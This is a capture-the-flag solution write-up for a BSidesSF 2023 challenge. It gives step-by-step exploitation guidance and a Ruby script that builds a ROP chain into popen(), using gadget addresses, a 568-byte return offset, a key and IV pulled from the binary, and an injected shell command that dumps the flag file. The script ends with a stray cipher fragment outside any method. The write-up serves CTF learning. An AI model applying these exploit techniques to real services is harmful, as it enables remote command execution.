This is a solution to the this challenge. It should only be published part-way
through the night, unless I push it early by mistake!

## Solution

[Here's the full source online](https://github.com/BSidesSF/ctf-2023/tree/main/challenges/getout3-apply/solution)

To solve level 3, there's a lot:

* Connect to the service called `apply`
* Leak a pointer to a useful string
  * Send a message, but make the opcode a string type instead of an integer
  * Make the string a system command, anything you want (netcat is installed)
  * When the service responds invalid opcode, it'll return that command's memory address
* Leak a pointer to the string "r"
  * We're going to return into `popen()`, and we need that in the second parameter
* Build a ROP chain:
  * Get the address for the command into rdi (using `pop rdi / ret` @ 0x401cbb)
  * Get the address for "r" into rsi (using `pop rdi / pop r15 / ret` @ 0x401cb9)
* Return into the `popen` function @ 0x4011e0
* Pad the start of your payload to exactly overwrite the return address (568 bytes)
* *Decrypt* your payload, using the encryption key / IV from the binary
  * (The key / IV will be in the source below)
* Ensure there are no NUL bytes in your payload - if there are, tweak some padding
* Break it into 200-byte chunks
* Send it to the service
  * Send an OPCODE_IDENTIFY (101) and use the token from the previous level
  * Send an OPCODE_APPLY (102) and send the payload as 5 strings

That's a lot!

Let's see it as source code:

```ruby
# encoding: ASCII-8bit

require 'openssl'

require './libgetout'

# Constants
RETURN_OFFSET = 568

POP_EDI_RET = 0x401cbb
POP_ESI_POP_R15_RET = 0x401cb9
POPEN_ADDRESS = 0x4011e0

OPCODE_INSTRUCTIONS = 100
OPCODE_IDENTIFY = 101
OPCODE_APPLY = 102
OPCODE_CHECK_STATUS = 103

# Token from level 2
TOKEN = "48756d61-6e73-2061-7265-207461737479"

# Key / IV (reversed from the binary)
KEY = "\xa6\x8b\x2a\x1c\x48\x0c\xac\x26\x24\x43\xab\xf9\x98\xa8\x1f\x2b"
IV = "\x4a\x3b\x9f\x46\x33\x0b\x76\x4f\x69\x0c\x99\xc6\x62\x6f\xb9\x35"

# This lets us bypass connect-back stuff, by sending the flag back on every
# conceivable socket
CMD = 0.upto(32).map do |i|
  "cat /ctf/level3-flag.txt >&#{i}"
end.join(';')

# Decrypt the payload
def get_encrypted_string(offset, data)
  # Add the padding
  padding = 0x41.chr * offset

  # Configure the cipher
  cipher = OpenSSL::Cipher.new('AES-128-CBC')
  cipher.decrypt
  cipher.padding = 0
  cipher.key = KEY
  cipher.iv = IV

  # Add the padding, and pad the end to a multiple of 16 (the block size)
  str = padding + data
  while(str.length % 16 != 0)
    str.concat("\0")
  end

  # Decrypt the payload
  return cipher.update(str) + cipher.final()
end

  cipher = OpenSSL::Cipher.new('AES-128-CBC')
  cipher.decrypt
  cipher.key = KEY
  cipher.iv = IV

  return cipher.update(data) + cipher.final()
